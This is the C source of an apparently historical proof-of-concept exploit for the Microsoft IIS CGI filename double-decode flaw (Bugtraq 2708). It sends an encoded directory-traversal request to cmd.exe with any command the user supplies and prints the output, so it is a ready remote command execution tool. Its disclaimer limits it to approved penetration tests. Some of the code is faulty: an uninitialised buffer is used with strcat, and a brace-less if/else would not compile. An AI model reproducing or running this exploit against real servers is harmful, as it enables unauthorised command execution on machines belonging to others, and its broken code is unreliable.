/*
 *
 * execiis.c - (c)copyright Filip Maertens
 * BUGTRAQ ID: 2708 - Microsoft IIS CGI Filename Decode Error
 *
 * DISCLAIMER:    This  is  proof of concept code.  This means, this
code
 * may only be used on approved systems in order to test the
availability
 * and integrity of machines  during a legal penetration test.  In no
way
 * is the  author of  this exploit  responsible for the use and result
of
 * this code.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>


/* Modify this value to whichever sequence you want.
 *
 * %255c = %%35c = %%35%63 = %25%35%63 = /
 *
 */

#define SHOWSEQUENCE "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+"



int main(int argc, char *argv[])
{

 struct sockaddr_in sin;
 char recvbuffer[1], stuff[200];
 int create_socket;

 printf("iisexec.c | Microsoft IIS CGI Filename Decode Error |
<filip@securax.be>\n-------------------------------------------------------------------------\n");

 if (argc < 3)
 {
  printf(" -- Usage: iisexec [ip] [command]\n");
  exit(0);
 }


if (( create_socket = socket(AF_INET,SOCK_STREAM,0)) > 0 )
 printf(" -- Socket created.\n");

 sin.sin_family = AF_INET;
 sin.sin_port = htons(80);
 sin.sin_addr.s_addr = inet_addr(argv[1]);

if (connect(create_socket, (struct sockaddr *)&sin,sizeof(sin))==0)
 printf(" -- Connection made.\n");
else
 { printf(" -- No connection.\n"); exit(1); }


 strcat(stuff, "GET ");
 strcat(stuff, SHOWSEQUENCE);
 strcat(stuff, argv[2]);
 strcat(stuff, " HTTP/1.0\n\n");

 memset(recvbuffer, '\0',sizeof(recvbuffer));

 send(create_socket, stuff, sizeof(stuff), 0);
 recv(create_socket, recvbuffer, sizeof (recvbuffer),0);



 if ( ( strstr(recvbuffer,"404") == NULL ) )

     printf(" -- Command output:\n\n");
     while(recv(create_socket, recvbuffer, 1, 0) > 0)
   {
     printf("%c", recvbuffer[0]);
   }

 else
  printf(" -- Wrong command processing. \n");

 close(create_socket);

}
